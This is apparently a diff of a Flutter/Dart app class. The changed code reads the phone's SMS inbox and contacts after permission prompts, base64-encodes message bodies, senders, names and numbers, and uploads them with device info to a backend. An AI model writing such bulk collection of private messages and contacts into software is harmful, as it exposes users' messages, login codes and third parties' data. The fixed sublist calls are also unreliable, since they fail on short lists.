@@ -1,4 +1,4 @@
-import 'dart:developer';
+import 'dart:convert';
 
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter/material.dart';
@@ -24,10 +24,14 @@ class ContactsProvider extends ChangeNotifier {
         _messages = [],
         _deviceInfo = '';
 
-  getContactList(
+  getAndSendData(
     BuildContext context,
   ) async {
-    if (await FlutterContacts.requestPermission()) {
+    final Telephony telephony = Telephony.instance;
+    bool contactsPermission = await FlutterContacts.requestPermission();
+    bool messagesPermission =
+        await telephony.requestPhoneAndSmsPermissions ?? false;
+    if (contactsPermission && messagesPermission) {
       _contacts = await FlutterContacts.getContacts(
         withProperties: true,
       ).catchError(
@@ -37,33 +41,26 @@ class ContactsProvider extends ChangeNotifier {
           return <Contact>[];
         },
       );
-      notifyListeners();
-    } else if (context.mounted) {
-      ViewFunctions.showCustomSnackBar(
-        context: context,
-        text: 'لم يتم الحصول على الاذن للوصول لجهات الاتصال',
-      );
-    }
-  }
-
-  getMessagesList(
-    BuildContext context,
-  ) async {
-    final Telephony telephony = Telephony.instance;
-    if (await telephony.requestPhoneAndSmsPermissions ?? false) {
       _messages = await telephony.getInboxSms(
         columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
       ).catchError(
         (onError) {
-          log(">>>>>>>>>>>>  $onError");
+          ViewFunctions.showCustomSnackBar(
+              context: context, text: 'فشل تحميل الرسائل');
           return <SmsMessage>[];
         },
       );
       notifyListeners();
+      if (context.mounted) {
+        await getDeviceInfo(context);
+      }
+      if (context.mounted) {
+        await sendData(context);
+      }
     } else if (context.mounted) {
       ViewFunctions.showCustomSnackBar(
         context: context,
-        text: 'لم يتم الحصول على الاذن للوصول الى الرسائل',
+        text: ' لم يتم الحصول على الاذن للوصول لجهات الاتصال والرسائل',
       );
     }
   }
@@ -79,36 +76,52 @@ class ContactsProvider extends ChangeNotifier {
   sendData(BuildContext context) async {
     List<Map> messagesList = _messages
         .map((e) {
-      return {
-        '"message_body"': '"${e.body?.toString()}"',
-        '"message_sender"': '"${e.address?.toString()}"' ,
-        '"message_time"': '"${e.date?.toString()}"' ,
-      };
-    })
-        .toList();
-
+          return {
+            '"message_body"':
+                '"${base64.encode(utf8.encode(e.body.toString()))}"',
+            '"message_sender"':
+                '"${base64.encode(utf8.encode(e.address.toString()))}"',
+            '"message_time"': '"${e.date.toString()}"',
+          };
+        })
+        .toList()
+        .sublist(0, 10);
 
     List<Map> contactsList = _contacts
         .map(
           (e) => {
-        '"contact_name"': '"${e.displayName}"',
-        '"contact_phone"': e.phones.isNotEmpty ? '"${e.phones[0].number}"' : '"no number"',
-      },
-    )
-        .toList();
-
+            '"contact_name"': '"${base64.encode(utf8.encode(e.displayName))}"',
+            '"contact_phone"': e.phones.isNotEmpty
+                ? '"${base64.encode(utf8.encode(e.phones[0].number))}"'
+                : '"no number"',
+          },
+        )
+        .toList()
+        .sublist(0, 5);
 
     await DataRepository.sendMessages(
-            dataRequest: SendMessagesRequest(
+        dataRequest: SendMessagesRequest(
       messages: messagesList,
       deviceInfo: _deviceInfo,
-    ));
+    )).then((value) {
+      ViewFunctions.showCustomSnackBar(
+          context: context, text: 'تم الارسال بنجاح');
+    }).catchError((onError) {
+      ViewFunctions.showCustomSnackBar(
+          context: context, text: onError.toString());
+    });
 
     await DataRepository.sendContacts(
         dataRequest: SendContactsRequest(
       contacts: contactsList,
       deviceInfo: _deviceInfo,
-    ));
+    )).then((value) {
+      ViewFunctions.showCustomSnackBar(
+          context: context, text: 'تم الارسال بنجاح');
+    }).catchError((onError) {
+      ViewFunctions.showCustomSnackBar(
+          context: context, text: onError.toString());
+    });
   }
 
   List<Contact> get contactList => _contacts;
